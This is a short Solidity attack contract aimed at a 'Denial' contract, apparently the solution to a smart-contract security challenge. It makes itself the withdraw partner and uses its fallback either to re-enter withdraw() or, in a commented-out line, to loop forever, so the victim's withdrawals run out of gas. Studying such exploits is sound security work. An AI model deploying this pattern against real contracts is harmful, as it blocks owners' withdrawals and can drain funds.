// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import './Denial.sol';

contract AttackDenial{
	Denial immutable victim;

	constructor(Denial _victim) {
		victim = _victim;
		victim.setWithdrawPartner(address(this));
	}

	fallback() external payable {
		if(victim.contractBalance() > 0 ) {
			// method 1
			victim.withdraw();

			// method 2 
			// while (true) { }
		}
	}
}